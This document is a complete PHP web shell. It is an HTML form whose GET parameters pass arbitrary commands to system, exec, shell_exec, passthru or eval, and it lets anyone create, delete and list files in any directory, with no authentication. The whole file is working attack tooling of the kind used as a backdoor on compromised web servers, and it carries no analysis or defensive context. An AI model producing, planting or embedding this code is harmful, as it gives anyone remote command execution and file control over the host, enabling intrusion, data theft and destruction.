<!DOCTYPE html>
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <label for="dir">Directory:</label>
    <input type="TEXT" name="dir" id="dir" size="50" value="<?php echo isset($_GET['dir']) ? $_GET['dir'] : getcwd(); ?>">
    <br>
    <label for="cmd">Command:</label>
    <input type="TEXT" name="cmd" id="cmd" size="80" autofocus>
    <label for="shell">Shell Function:</label>
    <select name="shell">
        <option value="system" selected>system</option>
        <option value="exec">exec</option>
        <option value="shell_exec">shell_exec</option>
        <option value="passthru">passthru</option>
        <option value="eval">eval</option>
    </select>
    <br>
    <label for="action">File Management Action:</label>
    <select name="action" id="action">
        <option value="none" selected>None</option>
        <option value="create">Create File</option>
        <option value="delete">Delete File</option>
        <option value="list">List Files</option>
    </select>
    <input type="TEXT" name="filename" placeholder="Filename" id="filename">
    <input type="TEXT" name="content" placeholder="Content (for create)" id="content">
    <input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if (isset($_GET['dir'])) {
        $dir = $_GET['dir'];
        if (is_dir($dir)) {
            chdir($dir);
        } else {
            echo "Invalid directory: $dir\n";
        }
    } else {
        $dir = getcwd();
    }

    echo "Current Directory: " . getcwd() . "\n\n";

    if (isset($_GET['cmd']) || isset($_GET['action'])) {
        $cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
        $shell = isset($_GET['shell']) ? $_GET['shell'] : 'system';
        $action = isset($_GET['action']) ? $_GET['action'] : 'none';
        $filename = isset($_GET['filename']) ? $_GET['filename'] : '';
        $content = isset($_GET['content']) ? $_GET['content'] : '';

        if ($action !== 'none') {
            switch ($action) {
                case 'create':
                    if ($filename) {
                        file_put_contents($filename, $content);
                        echo "File '$filename' created with content: $content";
                    } else {
                        echo "Filename is required for create action.";
                    }
                    break;
                case 'delete':
                    if ($filename) {
                        if (file_exists($filename)) {
                            unlink($filename);
                            echo "File '$filename' deleted.";
                        } else {
                            echo "File '$filename' does not exist.";
                        }
                    } else {
                        echo "Filename is required for delete action.";
                    }
                    break;
                case 'list':
                    $files = scandir(getcwd());
                    echo "Files in current directory:\n" . implode("\n", $files);
                    break;
                default:
                    echo "Invalid file management action.";
                    break;
            }
        } elseif ($cmd) {
            switch ($shell) {
                case 'system':
                    system($cmd);
                    break;
                case 'exec':
                    exec($cmd, $output);
                    echo implode("\n", $output);
                    break;
                case 'shell_exec':
                    echo shell_exec($cmd);
                    break;
                case 'passthru':
                    passthru($cmd);
                    break;
                case 'eval':
                    eval($cmd);
                    break;
                default:
                    echo "Invalid shell function.";
                    break;
            }
        }
    }
?>
</pre>
</body>
</html>
